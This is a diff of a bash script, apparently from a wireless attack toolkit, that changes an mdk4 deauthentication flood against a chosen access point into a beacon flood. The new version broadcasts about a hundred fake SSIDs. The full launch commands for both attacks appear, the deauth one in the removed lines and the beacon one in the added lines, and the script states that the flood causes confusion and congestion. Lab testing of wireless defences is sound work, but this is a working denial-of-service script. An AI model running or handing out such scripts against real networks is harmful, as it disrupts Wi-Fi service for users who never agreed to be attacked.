@@ -1,34 +1,42 @@
 #!/bin/bash
-# Utility: Deauth Flood using mdk4
-# 
+#
+# Utility: Beacon Flood using mdk4
+#
 # Description:
-#   Launches a targeted deauthentication flood using mdk4 against a specified BSSID.
+#   Launches a beacon flood attack to broadcast fake SSIDs using mdk4.
+#   This simulates many non-existent access points, causing confusion and congestion.
 #
 # Requirements:
 #   - mdk4 must be installed and in PATH
 #   - Must be run with sudo/root privileges
-#   - Interface must support monitor mode (automatically handled)
+#   - Wireless interface must support monitor mode
 #
 # Usage:
-#   ./run_mdk4_deauth.sh
+#   ./run_mdk4_beacon.sh
 #
 # Inputs:
-#   - Wireless interface (e.g. wlan0)
-#   - Target BSSID (e.g. AA:BB:CC:DD:EE:FF)
-#   - Attack duration in seconds (optional; defaults to config value)
+#   - SSID count (number of fake networks to broadcast)
+#   - Transmit interval in milliseconds
+#   - Duration (in seconds) to run the attack
 #
 # Example:
-#   ./run_mdk4_deauth.sh
+#   ./run_mdk4_beacon.sh
 #
 # Notes:
 #   - Automatically enables monitor mode if needed
 #   - Cleans up on SIGINT or timeout using EXIT trap
-#   - Resets MAC address to hardware default before launch
+#   - No client or AP involvement is required
 
 # Load helpers
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 source "$SCRIPT_DIR/config.sh"
 source "$SCRIPT_DIR/print.sh"
+
+# Check mdk4
+if ! command -v mdk4 &> /dev/null; then
+    print_fail "mdk4 not found. Please install it first."
+    exit 0
+fi
 
 # Cleanup
 cleanup() {
@@ -52,30 +60,38 @@ trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
-    print_warn "INTERFACE, BSSID, or CHANNEL not defined in config.sh"
-    exit 1
-fi
-
-# Check mdk4
-if ! command -v mdk4 &> /dev/null; then
-    print_fail "mdk4 not found. Please install it first."
-    exit 1
+if [[ -z "$INTERFACE" || -z "$T008_INTERVAL" ]]; then
+    print_warn "Required variables not defined in config.sh: INTERFACE or T008_INTERVAL"
+    exit 0
 fi
 
 # Display config
 echo "Interface    : $INTERFACE"
-echo "Target BSSID : $BSSID"
-echo "Channel      : $CHANNEL"
-echo "Mode         : T007 - Deauthentication Flood"
+echo "Mode         : T008 - Beacon Flood"
 print_blank
 
 # Confirm attack
-read -rp "[?] Proceed with attack? (y/N): " confirm
+print_prompt "[?] Proceed with attack? (y/N): "
+read -r confirm
+
 if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
     print_warn "Cancelled"
     exit 0
 fi
+
+# Input transmit interval
+while true; do
+    print_prompt "Transmit interval (ms) [default: ${T008_INTERVAL}]: "
+    read -r INTERVAL_MS
+
+    INTERVAL_MS="${INTERVAL_MS:-$T008_INTERVAL}"
+    
+    if [[ "$INTERVAL_MS" =~ ^[0-9]+$ ]]; then
+        break
+    else
+        print_fail "Invalid input. Enter a numeric value"
+    fi
+done
 
 # Input duration
 while true; do
@@ -92,7 +108,7 @@ while true; do
 done
 
 # Launch attack
-echo "T007" > /tmp/watt_attack_active
+echo "T008" > /tmp/watt_attack_active
 print_blank
 print_info "Starting Attack"
 
@@ -104,10 +120,22 @@ if [[ "$MODE" != "monitor" ]]; then
     print_success "Interface set to Monitor mode"
 fi
 
+# Check SSIDs
+SSID_FILE="$SCRIPT_DIR/$T008_SSID_FILE"
+
+if [[ -f "$SSID_FILE" ]]; then
+    print_info "Using existing SSID list: $T008_SSID_FILE"
+else
+    print_action "Generating SSID list: $T008_SSID_FILE"
+    seq -f "SSID-%03g" 1 100 > "$SSID_FILE"
+    print_success "Generated 100 SSIDs"
+fi
+
 # Run attack
 print_blank
-print_info "Running T007 - Deauthentication Flood for $DURATION seconds"
-sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$BSSID" -c "$CHANNEL"
+print_info "Running T008 - Beacon Flood for $DURATION seconds"
+sudo timeout "$DURATION" mdk4 "$INTERFACE" b -f "$SSID_FILE" -s "$INTERVAL_MS"
+
 EXIT_CODE=$?
 
 # Exit check
